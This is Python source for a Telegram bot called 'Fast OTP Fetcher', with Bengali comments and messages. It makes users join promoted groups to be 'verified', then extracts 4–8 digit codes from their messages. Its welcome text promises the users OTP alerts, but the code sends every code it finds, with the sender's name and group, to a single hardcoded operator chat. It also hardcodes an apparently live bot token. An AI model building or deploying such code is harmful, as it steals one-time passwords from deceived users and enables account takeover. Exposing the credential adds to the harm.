import logging
import re
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, MessageHandler, filters, CallbackContext, CommandHandler, CallbackQueryHandler
from telegram.constants import ParseMode

# ================== কনফিগারেশন ==================
TOKEN = "8862479708:AAG6jNfd_SKeBqA1Jq3BmL9mRlg0iOVQdTI"
YOUR_CHAT_ID = 7455109015

# তোমার ভেরিফিকেশন গ্রুপের লিংক (এখানে চ্যানেল/গ্রুপের username দাও)
REQUIRED_GROUPS = ["Easy_marketing1", "Easy_method1"]  # @ ছাড়া username

OTP_PATTERN = re.compile(r'\b(\d{4,8})\b')
authorized_users = set()  # যারা ভেরিফাই করেছে

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# ================== ভেরিফিকেশন ফাংশন ==================
async def is_user_member(bot, user_id):
    for group in REQUIRED_GROUPS:
        try:
            member = await bot.get_chat_member(chat_id=f"@{group}", user_id=user_id)
            if member.status in ["member", "administrator", "creator"]:
                return True
        except:
            pass
    return False

# ================== কমান্ডস ==================
async def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    keyboard = [[InlineKeyboardButton("✅ Verify Access", callback_data="verify")]]
    
    await update.message.reply_text(
        "🔥 **Welcome to Fast OTP Fetcher Bot!**\n\n"
        "OTP অটো ডিটেক্ট করে অ্যালার্ট পাবে।\n"
        "প্রথমে গ্রুপে জয়েন হয়ে **Verify** করো।",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.MARKDOWN
    )

async def verify(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    
    if await is_user_member(context.bot, user_id):
        authorized_users.add(user_id)
        await query.answer("✅ ভেরিফিকেশন সফল!")
        await query.edit_message_text("🎉 অ্যাক্সেস অনুমোদিত! এখন OTP অ্যালার্ট পাবে।")
    else:
        await query.answer("❌ গ্রুপে জয়েন হওনি। প্রথমে জয়েন করো।", show_alert=True)

async def status(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    state = "✅ অনুমোদিত" if user_id in authorized_users else "❌ ভেরিফাই করো"
    await update.message.reply_text(f"**তোমার স্ট্যাটাস:** {state}")

# ================== OTP হ্যান্ডলার ==================
async def handle_message(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id not in authorized_users:
        return  # শুধু ভেরিফাইড ইউজারদের জন্য

    message = update.message
    if not message or not message.text:
        return

    otps = OTP_PATTERN.findall(message.text)
    if otps:
        for otp in otps:
            alert = f"""🔥 **FAST OTP DETECTED!** 🔥

**OTP:** `{otp}`
**গ্রুপ:** {message.chat.title or 'Private'}
**ইউজার:** {message.from_user.first_name}
**টাইম:** {message.date}"""
            
            try:
                await context.bot.send_message(chat_id=YOUR_CHAT_ID, text=alert, parse_mode=ParseMode.MARKDOWN)
            except Exception as e:
                print(f"Error: {e}")

def main():
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CallbackQueryHandler(verify, pattern="verify"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🚀 Fast OTP Fetcher Bot চালু হয়েছে...")
    app.run_polling()

if __name__ == '__main__':
    main()
